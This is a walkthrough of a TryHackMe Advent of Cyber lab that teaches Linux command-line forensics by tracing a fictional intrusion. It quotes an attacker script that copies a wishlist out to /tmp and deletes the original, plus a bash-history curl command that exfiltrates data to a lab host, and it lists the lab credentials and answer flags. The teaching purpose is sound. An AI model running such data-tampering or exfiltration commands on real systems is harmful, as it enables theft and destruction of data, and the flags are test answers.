# TryHackMe – Advent of Cyber 2025
## Day 1: Linux CLI – Shells Bells

---

## 1. Overview
In this challenge, we investigate suspicious activity on tbfc-web01, a Linux server responsible for processing Christmas wishlists. McSkidy, who left behind a cryptic trail of clues, has been kidnapped. Our job is to follow her guidance, uncover hidden files, analyze logs, and track down evidence of a malicious intrusion tied to King Malhare and HopSec.

The task focuses entirely on using the Linux Command-Line Interface (CLI): navigating directories, uncovering hidden files, reading logs, using grep, switching users, and understanding shell scripts.

---

## 2. Starting the Environment
The machine boots into a Linux terminal with the user:
- **Username:** mcskidy
- **Password:** AoC2025!

If SSH is preferred, we can connect using:
```bash
ssh mcskidy@<machine_ip>
```

Once connected, we begin in `/home/mcskidy`.

---

## 3. Exploring the Home Directory
The first commands introduce the basics of Linux navigation and file interaction. Running:
```bash
ls
```

lists the visible content of McSkidy's home directory. Among the files is `README.txt`, which provides the first clue.

Viewing it:
```bash
cat README.txt
```

reveals that McSkidy detected an "Eggsploit" and created a security guide, hiding it intentionally.

---

## 4. Navigating to the Guides Directory
McSkidy mentioned writing a guide, so we check the Guides folder:
```bash
cd Guides
ls
```

The directory appears empty. However, in Linux, files starting with a dot (.) are hidden. To reveal them:
```bash
ls -la
```

A hidden file appears:
```
.guide.txt
```

Reading it:
```bash
cat .guide.txt
```

discloses the security guide McSkidy prepared, and at the end, a flag:
```
THM{learning-linux-cli}
```

The guide instructs us to inspect system logs in `/var/log` and look for failed login attempts.

---

## 5. Investigating Log Files for Failed Logins
We navigate to the log directory:
```bash
cd /var/log
```

Here, McSkidy recommended using grep to filter log content. To search for failed login attempts:
```bash
grep "Failed password" auth.log
```

The output shows repeated login failures for the "socmas" account originating from HopSec, confirming an attempted intrusion.

---

## 6. Searching for Malicious Files Using find
Following the pattern of "egg" artifacts mentioned in McSkidy's notes, we look for any suspicious files owned by the compromised user socmas.

Using:
```bash
find /home/socmas -name *egg*
```

returns:
```
/home/socmas/2025/eggstrike.sh
```

We proceed to inspect the script.

---

## 7. Analyzing the Eggstrike Script
Inside the 2025 directory:
```bash
cd /home/socmas/2025
cat eggstrike.sh
```

The script reveals a malicious sequence:
- The attacker extracts unique wishlist entries:
  ```bash
  cat wishlist.txt | sort | uniq > /tmp/dump.txt
  ```
- Deletes the legitimate wishlist:
  ```bash
  rm wishlist.txt
  ```
- Replaces it with an EASTMAS-themed wishlist:
  ```bash
  mv eastmas.txt wishlist.txt
  ```
- Prints tampering messages to reinforce the intrusion.

At the bottom of the script, an embedded flag is present:
```
THM{sir-carrotbane-attacks}
```

This confirms the involvement of Sir Carrotbane from HopSec's red team.

---

## 8. Reviewing System State and Privilege Escalation
The challenge also introduces the concept of the root user. To elevate privileges:
```bash
sudo su
```

After entering the password, the prompt changes, confirming root access.

We verify the active user:
```bash
whoami
```

Output:
```
root
```

With root access, we can analyze deeper indicators of compromise.

---

## 9. Inspecting the Root User's Bash History
The `.bash_history` file stores previously executed commands.

Navigating to the root home directory:
```bash
cd /root
cat .bash_history
```

The attacker used several curl-based exfiltration commands, but one line reveals a final embedded flag:
```bash
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
```

Flag:
```
THM{until-we-meet-again}
```

This serves as the last evidence of HopSec's presence on the system.

---

## 10. Summary of Recovered Evidence

| Description | Location | Flag |
|-------------|----------|------|
| Hidden guide flag | `/home/mcskidy/Guides/.guide.txt` | `THM{learning-linux-cli}` |
| Eggstrike script flag | `/home/socmas/2025/eggstrike.sh` | `THM{sir-carrotbane-attacks}` |
| Attacker final message | `/root/.bash_history` | `THM{until-we-meet-again}` |

Each artifact forms part of the attacker's trail and demonstrates key Linux CLI commands in a real investigation scenario.

---

## 11. Conclusion
This room provides a practical introduction to essential Linux command-line skills used daily in cybersecurity and systems administration. By progressing through the tasks, we learned how to:
- Navigate directories using `cd`, `ls`, and `pwd`
- Reveal hidden files with `ls -la`
- Read file contents using `cat`
- Filter logs with `grep`
- Search file systems using `find`
- Understand shell scripts
- Use `sudo su` to elevate privileges
- Review user history for forensic evidence

These foundational skills are crucial for real-world Linux investigations, SOC analysis, and incident response.
